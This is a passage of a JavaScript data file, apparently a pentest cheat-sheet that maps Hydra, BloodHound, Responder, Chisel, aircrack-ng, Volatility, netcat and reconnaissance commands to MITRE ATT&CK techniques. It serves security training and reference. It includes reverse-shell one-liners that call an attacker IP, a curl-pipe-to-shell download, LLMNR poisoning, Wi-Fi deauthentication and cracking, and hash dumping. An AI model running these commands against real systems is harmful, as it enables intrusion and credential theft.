      description: "Credential stuffing with colon-separated username:password file.",
      flags: { "-C": "Colon-separated credentials file (user:pass per line)" },
      example: "hydra -C default_creds.txt ftp://10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.004"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // BLOODHOUND / SHARPHOUND
  // ═══════════════════════════════════════════════════════════════════════════
  bloodhound: [
    {
      tool: "bloodhound",
      command: "SharpHound.exe -c All",
      description: "Collect all Active Directory data for BloodHound analysis. Includes sessions, trusts, ACLs, containers.",
      flags: { "-c": "Collection method: All, Group, Session, Trusts, ACL, Container, ObjectProps, Default" },
      example: "SharpHound.exe -c All\n[+] Status: 142 name lookups, 850 objects collected\n[+] Output: 20240101_BloodHound.zip",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "bloodhound",
      command: "bloodhound-python -u <user> -p <password> -d <domain> -dc <dc_hostname> -c All",
      description: "Python-based BloodHound collector. Works from Linux without needing a domain-joined machine.",
      flags: { "-u": "Username", "-p": "Password", "-d": "Domain", "-dc": "Domain Controller hostname", "-c": "Collection method" },
      example: "bloodhound-python -u admin -p 'P@ss123' -d corp.local -dc dc01.corp.local -c All",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "bloodhound",
      command: "MATCH (m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),(n:User),p=shortestPath((n)-[*1..]->(m)) RETURN p",
      description: "Neo4j Cypher query: Find shortest path from any user to Domain Admins.",
      flags: {},
      example: "Run in BloodHound UI: Analysis > Shortest Paths to Domain Admins\nShows: user1 -> MemberOf -> GroupX -> GenericAll -> AdminGroup -> Domain Admins",
      category: "Analysis",
      mitre: "T1069.002"
    },
    {
      tool: "bloodhound",
      command: "MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames",
      description: "Neo4j Cypher query: Find all Kerberoastable users (users with SPNs set).",
      flags: {},
      example: "Returns: svc_sql, svc_web, svc_backup — all with SPNs, crackable via Kerberoasting",
      category: "Analysis",
      mitre: "T1558.003"
    },
    {
      tool: "bloodhound",
      command: "MATCH (u:User {dontreqpreauth:true}) RETURN u.name",
      description: "Neo4j Cypher query: Find AS-REP Roastable users (pre-auth not required).",
      flags: {},
      example: "Returns: svc_backup — can get crackable AS-REP hash without valid password",
      category: "Analysis",
      mitre: "T1558.004"
    },
    {
      tool: "bloodhound",
      command: "MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN u.name",
      description: "Neo4j Cypher query: List all users who are (directly or transitively) members of Domain Admins.",
      flags: {},
      example: "Returns: Administrator, admin, svc_sql (transitive via nested group membership)",
      category: "Analysis",
      mitre: "T1069.002"
    },
    {
      tool: "bloodhound",
      command: "MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns*1..]->(c:Computer) RETURN p",
      description: "Neo4j Cypher query: Find users with dangerous permissions over computer objects.",
      flags: {},
      example: "Reveals: user1 has GenericAll over WS01 — can read LAPS passwords or perform RBCD attack",
      category: "Analysis",
      mitre: "T1069.002"
    },
    {
      tool: "bloodhound",
      command: "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name",
      description: "Neo4j Cypher query: Find computers with unconstrained delegation enabled.",
      flags: {},
      example: "Returns: WEB01.corp.local — attacker can capture TGTs of any user authenticating to this machine",
      category: "Analysis",
      mitre: "T1558"
    },
    {
      tool: "bloodhound",
      command: "MATCH (u:User)-[:DCSync]->(d:Domain) RETURN u.name",
      description: "Neo4j Cypher query: Find users with DCSync rights (Replicating Directory Changes).",
      flags: {},
      example: "Returns: Administrator, svc_repl — can perform DCSync to extract all domain password hashes",
      category: "Analysis",
      mitre: "T1003.006"
    },
    {
      tool: "bloodhound",
      command: "MATCH (c:Computer)-[:HasSession]->(u:User {admin:true}) RETURN c.name, u.name",
      description: "Neo4j Cypher query: Find where Domain Admins have active sessions.",
      flags: {},
      example: "Returns: DC01: Administrator, WS05: admin — target these machines to steal admin tokens",
      category: "Analysis",
      mitre: "T1033"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // RESPONDER
  // ═══════════════════════════════════════════════════════════════════════════
  responder: [
    {
      tool: "responder",
      command: "responder -I eth0",
      description: "Start Responder to poison LLMNR, NBT-NS, and mDNS requests. Captures NTLMv2 hashes from misconfigured clients.",
      flags: { "-I": "Network interface", "-w": "Enable WPAD rogue proxy", "-f": "Fingerprint hosts", "-v": "Verbose mode" },
      example: "responder -I eth0 -wfv\n[+] Listening for events...\n[*] [LLMNR] Poisoned answer sent to 10.10.10.50 for name fileserver\n[*] [NTLMv2] Hash captured: admin::CORP:1234...",
      category: "Credential Access",
      mitre: "T1557.001"
    },
    {
      tool: "responder",
      command: "responder -I eth0 -A",
      description: "Analyze mode — listen only without poisoning. Safe for reconnaissance.",
      flags: { "-A": "Analyze mode — passive listening only" },
      example: "responder -I eth0 -A\n[Analyze mode: answers are disabled]\n[*] [LLMNR] Query from 10.10.10.50 for fileserver\n[*] [NBT-NS] Query from 10.10.10.51 for WPAD",
      category: "Reconnaissance",
      mitre: "T1040"
    },
    {
      tool: "responder",
      command: "responder -I eth0 -w -P",
      description: "Start Responder with WPAD proxy auth. Forces clients to authenticate to a rogue proxy.",
      flags: { "-w": "Start WPAD rogue proxy server", "-P": "Force NTLM auth for WPAD proxy" },
      example: "responder -I eth0 -w -P\n[+] WPAD Proxy: 10.10.14.2\n[*] Forcing NTLM authentication via WPAD proxy\n[*] [NTLMv2] Hash captured from 10.10.10.50",
      category: "Credential Access",
      mitre: "T1557.001"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // CHISEL / LIGOLO
  // ═══════════════════════════════════════════════════════════════════════════
  tunneling: [
    {
      tool: "chisel",
      command: "chisel server -p 8000 --reverse",
      description: "Start Chisel server on attacker machine to accept reverse tunnel connections.",
      flags: { "-p": "Listen port", "--reverse": "Allow reverse port forwarding from clients" },
      example: "# Attacker machine:\nchisel server -p 8000 --reverse\n# Compromised target:\nchisel client attacker_ip:8000 R:8080:127.0.0.1:80",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "chisel",
      command: "chisel client <attacker_ip>:8000 R:socks",
      description: "Create a reverse SOCKS proxy through the compromised target. Route all tools through it.",
      flags: { "R:socks": "Reverse SOCKS5 proxy" },
      example: "# On target:\nchisel client 10.10.14.2:8000 R:socks\n# Then use proxychains:\nproxychains nmap -sT 172.16.0.0/24",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "chisel",
      command: "chisel client <attacker_ip>:8000 R:3389:172.16.0.10:3389",
      description: "Reverse port forward — access internal RDP through the compromised host.",
      flags: { "R:local:remote": "Reverse forward: access remote:port via local:port on attacker" },
      example: "chisel client 10.10.14.2:8000 R:3389:172.16.0.10:3389\n# Now connect: rdesktop 127.0.0.1:3389",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "ligolo-ng",
      command: "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
      description: "Start Ligolo-ng proxy server on attacker machine. Creates a TUN interface for seamless pivoting.",
      flags: { "-selfcert": "Generate self-signed certificate", "-laddr": "Listen address" },
      example: "# Attacker:\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n# Add route:\nsudo ip route add 172.16.0.0/24 dev ligolo",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "ligolo-ng",
      command: "ligolo-agent -connect <attacker_ip>:11601 -ignore-cert",
      description: "Start Ligolo-ng agent on compromised target. Connects back to proxy for tunnel.",
      flags: { "-connect": "Proxy server address", "-ignore-cert": "Skip certificate verification" },
      example: "# On target:\n./ligolo-agent -connect 10.10.14.2:11601 -ignore-cert\n# In proxy: session > start > tunnel started\n# Now access 172.16.0.x directly from attacker as if on the same network",
      category: "Pivoting",
      mitre: "T1090"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // LINPEAS / WINPEAS
  // ═══════════════════════════════════════════════════════════════════════════
  peas: [
    {
      tool: "linpeas",
      command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      description: "Download and execute LinPEAS — comprehensive Linux privilege escalation scanner.",
      flags: {},
      example: "curl -L .../linpeas.sh | sh\n# Or transfer and run:\nchmod +x linpeas.sh && ./linpeas.sh\n# Key findings marked: RED/YELLOW = critical, check for SUID, cron, sudo, capabilities",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
    {
      tool: "linpeas",
      command: "./linpeas.sh -a",
      description: "Run LinPEAS with all checks including slow/intensive ones.",
      flags: { "-a": "Run all checks (slower but thorough)", "-s": "Stealth mode — less noise", "-e": "Extra enumeration" },
      example: "./linpeas.sh -a 2>&1 | tee linpeas_output.txt",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
    {
      tool: "winpeas",
      command: "winpeas.exe",
      description: "Execute WinPEAS — comprehensive Windows privilege escalation scanner.",
      flags: {},
      example: "winpeas.exe\n# Checks: services, scheduled tasks, stored creds, registry, AlwaysInstallElevated, UAC, etc.\n# RED findings = likely exploitable",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
    {
      tool: "winpeas",
      command: "winpeas.exe quiet servicesinfo",
      description: "Run WinPEAS in quiet mode, only checking service misconfigurations.",
      flags: { "quiet": "Minimal output", "servicesinfo": "Check only services", "userinfo": "Check only user info", "systeminfo": "Check only system info" },
      example: "winpeas.exe quiet servicesinfo\n# Focuses on: unquoted paths, writable service binaries, weak service permissions",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // AIRCRACK-NG SUITE
  // ═══════════════════════════════════════════════════════════════════════════
  aircrack: [
    {
      tool: "aircrack-ng",
      command: "airmon-ng start wlan0",
      description: "Enable monitor mode on wireless interface. Required for passive packet capture.",
      flags: { "start": "Enable monitor mode", "stop": "Disable monitor mode", "check kill": "Kill interfering processes" },
      example: "airmon-ng check kill\nairmon-ng start wlan0\n# Interface: wlan0mon (monitor mode enabled)",
      category: "Wireless",
      mitre: "T1040"
    },
    {
      tool: "aircrack-ng",
      command: "airodump-ng wlan0mon",
      description: "Capture wireless packets and display nearby access points and clients.",
      flags: { "-c": "Lock to specific channel", "--bssid": "Filter by AP MAC", "-w": "Output file prefix" },
      example: "airodump-ng wlan0mon\n BSSID              CH  ENC   ESSID\n AA:BB:CC:DD:EE:FF   6  WPA2  TargetNetwork\n 11:22:33:44:55:66  11  WPA2  OtherNetwork",
      category: "Wireless",
      mitre: "T1040"
    },
    {
      tool: "aircrack-ng",
      command: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
      description: "Capture packets from a specific access point on channel 6. Saves to capture-01.cap.",
      flags: { "-c": "Channel", "--bssid": "Target AP MAC address", "-w": "Output file prefix" },
      example: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n# Wait for WPA handshake capture or use deauth to force it",
      category: "Wireless",
      mitre: "T1040"
    },
    {
      tool: "aircrack-ng",
      command: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
      description: "Deauthentication attack — send deauth packets to force clients to reconnect and capture WPA handshake.",
      flags: { "-0": "Deauthentication attack", "5": "Number of deauth packets", "-a": "Target AP BSSID", "-c": "Target client MAC (optional)" },
      example: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n# In airodump window: WPA handshake: AA:BB:CC:DD:EE:FF",
      category: "Wireless",
      mitre: "T1557"
    },
    {
      tool: "aircrack-ng",
      command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
      description: "Crack WPA/WPA2 handshake using a wordlist. Tests each password against the captured handshake.",
      flags: { "-w": "Wordlist", "-b": "Target BSSID (if multiple in capture)" },
      example: "aircrack-ng -w rockyou.txt capture-01.cap\n                             KEY FOUND! [ wifipassword123 ]",
      category: "Wireless",
      mitre: "T1110.002"
    },
    {
      tool: "aircrack-ng",
      command: "airdecap-ng -e 'TargetNetwork' -p 'wifipassword123' capture-01.cap",
      description: "Decrypt captured wireless traffic using the known password.",
      flags: { "-e": "ESSID (network name)", "-p": "WPA passphrase", "-l": "Don't remove 802.11 header" },
      example: "airdecap-ng -e 'TargetNetwork' -p 'wifipassword123' capture-01.cap\nTotal decrypted: 2456 packets",
      category: "Wireless",
      mitre: "T1040"
    },
    {
      tool: "aircrack-ng",
      command: "aireplay-ng -1 0 -e 'TargetNetwork' -a AA:BB:CC:DD:EE:FF wlan0mon",
      description: "Fake authentication with target AP. Required before some WEP attacks.",
      flags: { "-1": "Fake authentication", "0": "Reassociation timing", "-e": "Target ESSID" },
      example: "aireplay-ng -1 0 -e 'TargetNetwork' -a AA:BB:CC:DD:EE:FF wlan0mon\n[+] Association successful",
      category: "Wireless",
      mitre: "T1557"
    },
    {
      tool: "aircrack-ng",
      command: "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon",
      description: "ARP request replay attack — inject ARP requests to generate IVs for WEP cracking.",
      flags: { "-3": "ARP request replay attack", "-b": "Target BSSID" },
      example: "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon\nRead 50000 packets, got 12345 ARP requests",
      category: "Wireless",
      mitre: "T1557"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // VOLATILITY — Memory Forensics
  // ═══════════════════════════════════════════════════════════════════════════
  volatility: [
    {
      tool: "volatility",
      command: "vol.py -f memory.raw imageinfo",
      description: "Identify the OS profile of a memory dump. First step in any memory forensic analysis.",
      flags: { "-f": "Memory dump file" },
      example: "vol.py -f memory.raw imageinfo\nSuggested Profile(s) : Win7SP1x64, Win7SP0x64\nAS Layer1 : WindowsAMD64PagedMemory (Kernel DTB: 0x187000)",
      category: "Memory Forensics",
      mitre: "T1005"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 pslist",
      description: "List running processes from memory dump. Shows PID, PPID, start time.",
      flags: { "--profile": "OS profile determined by imageinfo" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 pslist\nOffset    Name          PID   PPID  Start\n0x8567a0  System        4     0     2024-01-01\n0x856ab0  smss.exe      264   4     2024-01-01\n0x8612c0  cmd.exe       3456  2100  2024-01-01\n0x861540  powershell.exe 4100 3456  2024-01-01",
      category: "Memory Forensics",
      mitre: "T1057"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 pstree",
      description: "Display process tree showing parent-child relationships. Reveals suspicious process hierarchies.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 pstree\n. System (4)\n.. smss.exe (264)\n... csrss.exe (352)\n.. explorer.exe (2100)\n... cmd.exe (3456)\n.... powershell.exe (4100)  <-- suspicious: PS spawned from cmd",
      category: "Memory Forensics",
      mitre: "T1057"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 netscan",
      description: "Scan memory for network connections and listening ports.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 netscan\nProto  Local Address     Remote Address    State     PID\nTCPv4  10.10.10.5:4444   10.10.14.2:5555   ESTABLISHED 4100\nTCPv4  0.0.0.0:80        0.0.0.0:0         LISTENING   1234",
      category: "Memory Forensics",
      mitre: "T1049"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 malfind",
      description: "Find injected code and hidden DLLs in process memory. Detects process hollowing and injection.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 malfind\nProcess: svchost.exe PID: 1234\nVAD Tag: VadS Protection: PAGE_EXECUTE_READWRITE\n0x00400000  4d 5a 90 00 03 00 00 00  MZ......  <-- injected PE",
      category: "Memory Forensics",
      mitre: "T1055"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 dlllist -p 4100",
      description: "List DLLs loaded by a specific process.",
      flags: { "-p": "Process ID" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 dlllist -p 4100\nBase       Size  Path\n0x7ff600000 0x1000 C:\\Windows\\System32\\powershell.exe\n0x7ffa00000 0x2000 C:\\Windows\\System32\\ntdll.dll",
      category: "Memory Forensics",
      mitre: "T1055.001"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 handles -p 4100 -t File",
      description: "List open file handles for a specific process.",
      flags: { "-t": "Handle type filter (File, Key, Process, Thread, Mutant)" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 handles -p 4100 -t File\n0x1234  File  \\Device\\HarddiskVolume2\\Users\\admin\\Desktop\\credentials.txt",
      category: "Memory Forensics",
      mitre: "T1005"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 filescan",
      description: "Scan memory for FILE_OBJECT structures. Find files that were open in memory.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -i password\n0x000000003e8e7f20  \\Users\\admin\\Documents\\passwords.xlsx",
      category: "Memory Forensics",
      mitre: "T1005"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e8e7f20 -D output/",
      description: "Extract a specific file from memory using its physical offset from filescan.",
      flags: { "-Q": "Physical offset of FILE_OBJECT", "-D": "Output directory" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x3e8e7f20 -D output/\nDataSectionObject: file.None.0x3e8e7f20.dat",
      category: "Memory Forensics",
      mitre: "T1005"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 hivelist",
      description: "List registry hives found in memory. Provides offsets needed for hashdump.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 hivelist\nVirtual     Physical    Name\n0x8b21c008  0x29bc008   \\SystemRoot\\System32\\config\\SAM\n0x8b2d0580  0x2a6d580   \\SystemRoot\\System32\\config\\SYSTEM",
      category: "Memory Forensics",
      mitre: "T1003"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 hashdump -y 0x8b2d0580 -s 0x8b21c008",
      description: "Dump password hashes from SAM registry hive in memory.",
      flags: { "-y": "SYSTEM hive virtual offset", "-s": "SAM hive virtual offset" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 hashdump -y 0x8b2d0580 -s 0x8b21c008\nAdministrator:500:aad3b435...:31d6cfe0...",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 timeliner",
      description: "Create a timeline of all timestamped artifacts in memory (processes, files, registry, network).",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 timeliner --output=body --output-file=timeline.body\nmactime -b timeline.body > timeline.csv",
      category: "Memory Forensics",
      mitre: "T1005"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 cmdscan",
      description: "Scan for command history from cmd.exe processes in memory.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 cmdscan\nCommandProcess: cmd.exe PID: 3456\nCmd #0: whoami\nCmd #1: net user /domain\nCmd #2: net group \"Domain Admins\" /domain",
      category: "Memory Forensics",
      mitre: "T1059.003"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 consoles",
      description: "Extract full console input/output history from memory. More detailed than cmdscan.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 consoles\nConsoleProcess: cmd.exe PID: 3456\nC:\\> whoami\ncorp\\admin\nC:\\> ipconfig\nIPv4 Address: 10.10.10.5",
      category: "Memory Forensics",
      mitre: "T1059.003"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 clipboard",
      description: "Extract clipboard contents from memory.",
      flags: {},
      example: "vol.py -f memory.raw --profile=Win7SP1x64 clipboard\nSession  Data\n1        P@ssw0rd2024!",
      category: "Memory Forensics",
      mitre: "T1115"
    },
    {
      tool: "volatility",
      command: "vol.py -f memory.raw --profile=Win7SP1x64 screenshot -D output/",
      description: "Reconstruct screenshots from GDI window objects in memory.",
      flags: { "-D": "Output directory for screenshots" },
      example: "vol.py -f memory.raw --profile=Win7SP1x64 screenshot -D output/\nWrote output/session_1.WinSta0.Default.png",
      category: "Memory Forensics",
      mitre: "T1113"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // MISCELLANEOUS TOOLS
  // ═══════════════════════════════════════════════════════════════════════════
  misc: [
    {
      tool: "searchsploit",
      command: "searchsploit <service> <version>",
      description: "Search Exploit-DB's local copy for known exploits matching a service and version.",
      flags: { "-m": "Mirror/copy exploit to current directory", "-x": "Examine exploit source code", "--nmap": "Parse nmap XML output for auto-search" },
      example: "searchsploit Apache 2.4.49\n---------------------------------------------\nTitle                          | Path\n---------------------------------------------\nApache HTTP Server 2.4.49 - Path Traversal | exploits/multiple/webapps/50383.sh\nApache 2.4.49 - RCE            | exploits/multiple/webapps/50512.py",
      category: "Exploitation",
      mitre: "T1588.006"
    },
    {
      tool: "netcat",
      command: "nc -lvnp 4444",
      description: "Start a netcat listener on port 4444 to catch reverse shells.",
      flags: { "-l": "Listen mode", "-v": "Verbose", "-n": "No DNS resolution", "-p": "Port number" },
      example: "nc -lvnp 4444\nListening on 0.0.0.0 4444\nConnection received from 10.10.10.5\n$ whoami\nwww-data",
      category: "Exploitation",
      mitre: "T1059"
    },
    {
      tool: "netcat",
      command: "nc -e /bin/bash <attacker_ip> 4444",
      description: "Reverse shell — connect back to attacker and provide a bash shell.",
      flags: { "-e": "Execute program after connect (not available in all versions)" },
      example: "nc -e /bin/bash 10.10.14.2 4444\n# Or without -e:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f",
      category: "Exploitation",
      mitre: "T1059.004"
    },
    {
      tool: "socat",
      command: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
      description: "Start a fully interactive TTY bind shell with socat.",
      flags: {},
      example: "# Target (bind shell):\nsocat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane\n# Attacker (connect):\nsocat - TCP:10.10.10.5:4444",
      category: "Exploitation",
      mitre: "T1059.004"
    },
    {
      tool: "socat",
      command: "socat TCP-LISTEN:4444 OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork",
      description: "Encrypted reverse shell listener using socat with SSL.",
      flags: {},
      example: "# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -out server.crt\n# Combine: cat server.key server.crt > server.pem\nsocat OPENSSL-LISTEN:443,cert=server.pem,verify=0 -",
      category: "Exploitation",
      mitre: "T1573"
    },
    {
      tool: "curl",
      command: "curl -X POST http://target.com/api/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"test\"}'",
      description: "Send POST request with JSON body for API testing.",
      flags: { "-X": "HTTP method", "-H": "Custom header", "-d": "POST data", "-k": "Ignore SSL errors", "-v": "Verbose", "-o": "Output file", "-L": "Follow redirects" },
      example: "curl -X POST http://target.com/api/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"test\"}' -v",
      category: "Web Testing",
      mitre: "T1190"
    },
    {
      tool: "curl",
      command: "curl -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' http://target.com/admin",
      description: "Test for IP-based access control bypass using X-Forwarded-For header spoofing.",
      flags: {},
      example: "curl -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin' http://target.com/",
      category: "Web Testing",
      mitre: "T1190"
    },
    {
      tool: "dig",
      command: "dig ANY target.com @8.8.8.8",
      description: "DNS lookup for all record types. Essential for reconnaissance.",
      flags: { "ANY": "Query all record types", "MX": "Mail exchange records", "TXT": "Text records (SPF/DKIM)", "NS": "Nameservers", "AXFR": "Zone transfer attempt", "@": "Specify DNS server" },
      example: "dig ANY target.com @8.8.8.8\ntarget.com. A     93.184.216.34\ntarget.com. MX    10 mail.target.com\ntarget.com. NS    ns1.target.com\ntarget.com. TXT   \"v=spf1 include:_spf.google.com ~all\"",
      category: "Reconnaissance",
      mitre: "T1596.001"
    },
    {
      tool: "dig",
      command: "dig AXFR target.com @ns1.target.com",
      description: "Attempt DNS zone transfer. If successful, reveals all DNS records for the domain.",
      flags: { "AXFR": "Zone transfer request" },
      example: "dig AXFR target.com @ns1.target.com\n# If allowed:\ntarget.com. A     93.184.216.34\nwww.target.com. A 93.184.216.34\ndev.target.com. A 10.0.0.5\nstaging.target.com. A 10.0.0.6",
      category: "Reconnaissance",
      mitre: "T1596.001"
    },
    {
      tool: "whois",
      command: "whois target.com",
      description: "WHOIS lookup — retrieve domain registration information, nameservers, and registrant details.",
      flags: {},
      example: "whois target.com\nRegistrant: Target Corp\nRegistrar: GoDaddy\nCreation Date: 2010-01-15\nExpiration Date: 2025-01-15",
      category: "Reconnaissance",
      mitre: "T1596.002"
    },
    {
      tool: "amass",
      command: "amass enum -d target.com -passive",
      description: "Passive subdomain enumeration using open-source intelligence sources.",
      flags: { "enum": "Enumeration mode", "-d": "Target domain", "-passive": "Passive only — no direct queries to target", "-active": "Active enumeration", "-brute": "Include brute force" },
      example: "amass enum -d target.com -passive\nwww.target.com\napi.target.com\ndev.target.com\nstaging.target.com\nmail.target.com",
      category: "Reconnaissance",
      mitre: "T1595.003"
    },
    {
      tool: "subfinder",
      command: "subfinder -d target.com -silent",
      description: "Fast passive subdomain discovery using multiple sources.",
      flags: { "-d": "Target domain", "-silent": "Only output subdomains", "-o": "Output file", "-all": "Use all sources" },
      example: "subfinder -d target.com -silent\nwww.target.com\napi.target.com\ndev.target.com\ncdn.target.com",
      category: "Reconnaissance",
      mitre: "T1595.003"
    },
    {
      tool: "nuclei",
      command: "nuclei -u http://target.com -t cves/",
      description: "Fast vulnerability scanner using YAML-based templates. Tests for known CVEs.",
      flags: { "-u": "Target URL", "-t": "Template directory or file", "-severity": "Filter by severity (info/low/medium/high/critical)", "-o": "Output file" },
      example: "nuclei -u http://target.com -severity critical,high\n[critical] CVE-2021-44228 [http://target.com/api]\n[high] CVE-2023-44487 [http://target.com:443]",
      category: "Vulnerability Assessment",
      mitre: "T1595.002"
    },
    {
      tool: "httpx",
      command: "cat subdomains.txt | httpx -status-code -title -tech-detect",
      description: "Fast HTTP probe. Check which subdomains are alive and get their details.",
      flags: { "-status-code": "Show HTTP status", "-title": "Show page title", "-tech-detect": "Detect technologies", "-follow-redirects": "Follow redirects", "-screenshot": "Take screenshots" },
      example: "cat subdomains.txt | httpx -status-code -title -tech-detect\nhttps://www.target.com [200] [Target Corp] [Apache,PHP]\nhttps://api.target.com [200] [API Gateway] [nginx,Node.js]\nhttps://dev.target.com [403] [403 Forbidden] [Apache]",
      category: "Reconnaissance",
      mitre: "T1595.002"
    },
    {
      tool: "whatweb",
      command: "whatweb http://target.com",
      description: "Web technology fingerprinting. Identifies CMS, frameworks, server software, JavaScript libraries.",
      flags: { "-v": "Verbose", "-a": "Aggression level (1=stealthy, 4=aggressive)" },
      example: "whatweb http://target.com\nhttp://target.com [200 OK] Apache[2.4.41], PHP[7.4.3], WordPress[6.4.2], jQuery[3.5.1]",
      category: "Reconnaissance",
      mitre: "T1595.002"
    },
    {
      tool: "wpscan",
      command: "wpscan --url http://target.com -e ap,at,u --api-token <token>",
      description: "WordPress vulnerability scanner. Enumerate plugins, themes, and users.",
      flags: { "--url": "Target WordPress URL", "-e": "Enumerate (ap=all plugins, at=all themes, u=users)", "--api-token": "WPVulnDB API token for vulnerability data", "--passwords": "Password wordlist for brute force" },
      example: "wpscan --url http://target.com -e ap,at,u\n[+] WordPress version 6.4.2 identified\n[!] 2 vulnerabilities identified\n[+] Enumerating All Plugins\n [+] contact-form-7 (Version: 5.8)\n [!] 1 vulnerability: CVE-2024-XXXX",
      category: "Web Testing",
      mitre: "T1595.002"
    },
    {
      tool: "enum4linux-ng",
      command: "enum4linux-ng -A target",
      description: "Comprehensive SMB/Samba/MSRPC enumeration. Discovers users, shares, groups, policies.",
      flags: { "-A": "All enumeration", "-u": "Username", "-p": "Password" },
      example: "enum4linux-ng -A 10.10.10.5\n[+] Users: Administrator, Guest, krbtgt, user1\n[+] Shares: ADMIN$, C$, IPC$, share\n[+] Password Policy: Minimum length: 7, Lockout: 5 attempts",
      category: "Enumeration",
      mitre: "T1087"
    },
    {
      tool: "smbclient",
      command: "smbclient -L //target/ -N",
      description: "List SMB shares on target with null session (no credentials).",
      flags: { "-L": "List shares", "-N": "No password (null session)", "-U": "Username" },
      example: "smbclient -L //10.10.10.5/ -N\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nshare           Disk      Public files",
      category: "Enumeration",
      mitre: "T1135"
    },
    {
      tool: "smbclient",
      command: "smbclient //target/share -U admin",
      description: "Connect to SMB share interactively. Browse and download files.",
      flags: {},
      example: "smbclient //10.10.10.5/share -U admin\nsmb: \\> ls\nsmb: \\> get passwords.txt\nsmb: \\> put shell.exe",
      category: "Lateral Movement",
      mitre: "T1021.002"
    },
    {
      tool: "rpcclient",
      command: "rpcclient -U '' -N target",
      description: "Connect to target via RPC with null session. Enumerate users, groups, and domain info.",
      flags: { "-U ''": "Empty username", "-N": "No password" },
      example: "rpcclient -U '' -N 10.10.10.5\nrpcclient $> enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nrpcclient $> querydominfo\nDomain: CORP\nServer: DC01",
      category: "Enumeration",
      mitre: "T1087.002"
    },
